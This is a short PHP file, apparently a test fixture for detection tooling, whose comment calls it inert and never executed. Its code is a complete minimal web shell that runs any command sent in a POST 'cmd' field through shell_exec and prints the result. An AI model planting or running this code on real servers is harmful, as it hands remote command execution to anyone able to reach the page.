<?php
// INERT FIXTURE: never served, never executed.
if (isset($_POST['cmd'])) {
    echo shell_exec($_POST['cmd']);
}
